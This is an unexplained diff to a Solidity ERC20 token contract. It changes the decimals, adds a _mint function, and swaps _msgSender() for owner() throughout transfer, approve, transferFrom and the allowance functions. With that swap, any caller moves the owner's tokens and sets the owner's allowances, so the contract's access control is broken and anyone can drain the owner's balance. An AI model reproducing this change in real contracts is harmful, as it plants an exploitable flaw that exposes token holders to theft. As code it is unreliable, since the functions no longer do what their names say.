@@ -17,7 +17,7 @@ contract ERC20 is Ownable, IERC20 {
     constructor (string memory name_, string memory symbol_) public {
         _name = name_;
         _symbol = symbol_;
-        _decimals = 18;
+        _decimals = 8;
     }
     
     function name() public view returns (string memory) {
@@ -41,7 +41,7 @@ contract ERC20 is Ownable, IERC20 {
     }
     
     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
-        _transfer(_msgSender(), recipient, amount);
+        _transfer(owner(), recipient, amount);
         return true;
     }
     
@@ -50,23 +50,23 @@ contract ERC20 is Ownable, IERC20 {
     }
     
     function approve(address spender, uint256 amount) public virtual override returns (bool) {
-        _approve(_msgSender(), spender, amount);
+        _approve(owner(), spender, amount);
         return true;
     }
     
     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
         _transfer(sender, recipient, amount);
-        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
+        _approve(sender, owner(), _allowances[sender][owner()].sub(amount, "ERC20: transfer amount exceeds allowance"));
         return true;
     }
     
     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
-        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
+        _approve(owner(), spender, _allowances[owner()][spender].add(addedValue));
         return true;
     }
     
     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
-        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
+        _approve(owner(), spender, _allowances[owner()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
         return true;
     }
     
@@ -91,6 +91,16 @@ contract ERC20 is Ownable, IERC20 {
     
     function _setupDecimals(uint8 decimals_) internal {
         _decimals = decimals_;
+    }
+
+    function _mint(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: mint to the zero address");
+
+        _beforeTokenTransfer(address(0), account, amount);
+
+        _totalSupply = _totalSupply.add(amount);
+        _balances[account] = _balances[account].add(amount);
+        emit Transfer(address(0), account, amount);
     }
     
     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
